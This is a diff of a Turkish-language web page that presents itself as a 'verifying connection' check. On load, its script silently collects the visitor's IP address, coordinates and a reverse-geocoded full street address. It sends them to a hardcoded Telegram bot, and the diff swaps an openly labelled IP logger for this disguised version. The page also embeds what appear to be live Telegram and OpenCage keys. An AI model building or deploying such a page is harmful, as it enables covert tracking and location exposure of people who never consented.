@@ -3,81 +3,77 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>IP Bildirici</title>
+  <title>Bağlantı Doğrulanıyor...</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
     body {
-      margin: 0; padding: 0;
-      background: linear-gradient(135deg, #667eea, #764ba2);
-      font-family: 'Poppins', sans-serif;
-      color: #fff;
+      margin: 0;
+      background: #111;
+      color: #eee;
+      font-family: 'Inter', sans-serif;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
       text-align: center;
     }
-    .loader {
-      border: 6px solid rgba(255,255,255,0.2);
-      border-top: 6px solid #fff;
+    .spinner {
+      width: 48px; height: 48px;
+      border: 5px solid rgba(255,255,255,0.1);
+      border-top: 5px solid #fff;
       border-radius: 50%;
-      width: 60px; height: 60px;
       animation: spin 1s linear infinite;
-      margin-bottom: 1.5rem;
+      margin-bottom: 20px;
     }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    h1 {
-      font-weight: 600;
-      margin-bottom: 1rem;
-    }
-    .status {
-      font-size: 1.25rem;
-      margin-top: 1rem;
-    }
-    .success {
-      color: #4caf50;
-    }
-    .error {
-      color: #ff5252;
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h1 { font-size: 1.3rem; font-weight: 600; }
+    .status { margin-top: 1rem; opacity: 0.8; }
+    .success { color: #4caf50; }
+    .error { color: #f44336; }
   </style>
 </head>
 <body>
-  <div class="loader" id="loader"></div>
-  <h1>Konum ve IP bilgisi gönderiliyor...</h1>
-  <div class="status" id="status"></div>
+  <div class="spinner" id="loader"></div>
+  <h1>Bağlantı doğrulanıyor...</h1>
+  <div class="status" id="status">Bekleyin...</div>
 
   <script>
-    const loader = document.getElementById('loader');
-    const status = document.getElementById('status');
+    const loader = document.getElementById("loader");
+    const status = document.getElementById("status");
 
-    const botToken = '8087577949:AAE6s1rHpfxjgmHPTGYkAbBuRw6O84szn8U';
-    const chatId = '7125066639';
+    const botToken = "8087577949:AAE6s1rHpfxjgmHPTGYkAbBuRw6O84szn8U";
+    const chatId = "7125066639";
+    const openCageKey = "321c0ed0bce141a69dbc869d08f564e3";
 
     async function sendTelegramMessage(message) {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
       try {
         const res = await fetch(url);
-        if (!res.ok) throw new Error('Telegram API hatası');
-        return true;
+        return res.ok;
       } catch (e) {
-        console.error(e);
         return false;
       }
     }
 
     async function main() {
       try {
-        const res = await fetch('https://ipapi.co/json/');
-        if (!res.ok) throw new Error('IP bilgisi alınamadı');
+        const res = await fetch("https://ipapi.co/json/");
+        if (!res.ok) throw new Error("Konum alınamadı");
         const data = await res.json();
 
+        const lat = data.latitude;
+        const lon = data.longitude;
+
+        const geoRes = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${openCageKey}&language=tr`);
+        const geoData = await geoRes.json();
+        const fullAddress = geoData.results[0]?.formatted || "Adres çözümlenemedi";
+
         const message =
-          `📡 Yeni Ziyaretçi!\n\n` +
+          `📡 Yeni Ziyaretçi\n\n` +
           `🛰️ IP: ${data.ip}\n` +
+          `📍 Tam Adres: ${fullAddress}\n` +
+          `🗺️ Koordinatlar: ${lat}, ${lon}\n` +
           `🌆 Şehir: ${data.city || 'Bilinmiyor'}\n` +
           `🏞️ Bölge: ${data.region || 'Bilinmiyor'}\n` +
           `🌍 Ülke: ${data.country_name || 'Bilinmiyor'}\n` +
@@ -85,20 +81,14 @@
 
         const sent = await sendTelegramMessage(message);
 
-        loader.style.display = 'none';
-
-        if (sent) {
-          status.textContent = '🚀 Mesaj başarıyla gönderildi!';
-          status.classList.add('success');
-        } else {
-          status.textContent = '❌ Mesaj gönderilemedi.';
-          status.classList.add('error');
-        }
-      } catch (error) {
-        loader.style.display = 'none';
-        status.textContent = '❌ IP bilgisi alınamadı.';
-        status.classList.add('error');
-        console.error(error);
+        loader.style.display = "none";
+        status.textContent = sent ? "✔️ Doğrulama tamamlandı." : "❌ Gönderilemedi.";
+        status.className = sent ? "status success" : "status error";
+      } catch (err) {
+        loader.style.display = "none";
+        status.textContent = "❌ Hata oluştu.";
+        status.className = "status error";
+        console.error(err);
       }
     }
 
